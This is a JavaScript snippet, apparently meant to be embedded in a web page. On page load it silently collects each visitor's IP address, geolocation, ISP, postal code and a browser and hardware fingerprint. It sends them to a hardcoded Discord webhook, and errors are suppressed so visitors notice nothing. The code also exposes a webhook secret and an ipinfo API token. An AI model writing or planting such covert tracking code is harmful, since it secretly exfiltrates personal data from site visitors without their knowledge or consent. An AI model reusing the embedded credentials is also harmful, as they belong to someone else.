async function sendDiscordMessage(message) {
  const webhookUrl = 'https://discord.com/api/webhooks/1375534402389413888/wfcYejfEJTgGFMR1hcxjfKwwMwn-hPriJ6Crmk0O6h_OrpXvnL2HMHAzNhy74HqrUhoW';
  const payload = { content: message };

  try {
    const res = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!res.ok) throw new Error(`Discord API error: ${res.status}`);
  } catch (err) {}
}

window.addEventListener('load', async () => {
  try {
    const ipRes = await fetch('https://ipinfo.io/json?token=f67c5ecf0e57d3');
    if (!ipRes.ok) throw new Error('IP info API error');
    const visitor = await ipRes.json();

    const ua = navigator.userAgent;
    const language = navigator.language;
    const platform = navigator.platform;
    const cookieEnabled = navigator.cookieEnabled;
    const deviceMemory = navigator.deviceMemory || 'Unknown';
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
    const screenRes = `${screen.width}x${screen.height}`;
    const availRes = `${screen.availWidth}x${screen.availHeight}`;
    const pixelRatio = window.devicePixelRatio || 1;
    const onlineStatus = navigator.onLine ? 'Yes' : 'No';

    const message = `
**💻 Visitor Info**
IP: ${visitor.ip}
Country: ${visitor.country || 'Unknown'}
City: ${visitor.city || 'Unknown'}
Region: ${visitor.region || 'Unknown'}
Approx. Location: ${visitor.loc || 'Unknown'}
ISP: ${visitor.org || 'Unknown'}
Postal Code: ${visitor.postal || 'Unknown'}
Timezone: ${visitor.timezone || 'Unknown'}

**🖥️ System Info**
Browser: ${ua.substring(0, 100)}
Language: ${language}
Platform: ${platform}
Cookies Enabled: ${cookieEnabled ? 'Yes' : 'No'}
RAM: ${deviceMemory} GB
CPU Cores: ${hardwareConcurrency}
Online: ${onlineStatus}

**🖼️ Screen Info**
Screen Resolution: ${screenRes}
Available Space: ${availRes}
Pixel Ratio: ${pixelRatio}
`;

    sendDiscordMessage(message);
  } catch (e) {}
});
